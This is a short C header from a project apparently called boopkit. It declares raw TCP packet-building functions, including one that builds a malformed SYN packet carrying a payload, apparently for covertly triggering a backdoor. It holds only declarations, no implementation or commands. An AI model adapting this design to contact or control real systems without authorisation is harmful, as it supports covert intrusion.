// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//

#ifndef BOOPKIT_BOOP_H
#define BOOPKIT_BOOP_H

#define DATAGRAM_LEN 4096
#define OPT_SIZE 20
#define MAX_PORT_STR 24

struct pseudo_header {
  u_int32_t source_address;
  u_int32_t dest_address;
  u_int8_t placeholder;
  u_int8_t protocol;
  u_int16_t tcp_length;
};

void create_data_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
                        int32_t seq, int32_t ack_seq, char *data, int data_len,
                        char **out_packet, int *out_packet_len);
void create_syn_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
                       char **out_packet, int *out_packet_len);
void create_ack_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
                       int32_t seq, int32_t ack_seq, char **out_packet,
                       int *out_packet_len);
void create_ack_rst_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
                           int32_t seq, int32_t ack_seq, char **out_packet,
                           int *out_packet_len);
void create_rst_packet(struct sockaddr_in *src, struct sockaddr_in *dst,
                       char **out_packet, int *out_packet_len);
void create_bad_syn_packet_payload(struct sockaddr_in *src,
                                   struct sockaddr_in *dst, char **out_packet,
                                   int *out_packet_len, char *payload);
int receive_from(int sock, char *buffer, size_t buffer_length,
                 struct sockaddr_in *dst);
void read_seq_and_ack(const char *packet, uint32_t *seq, uint32_t *ack);

#endif  // BOOPKIT_BOOP_H
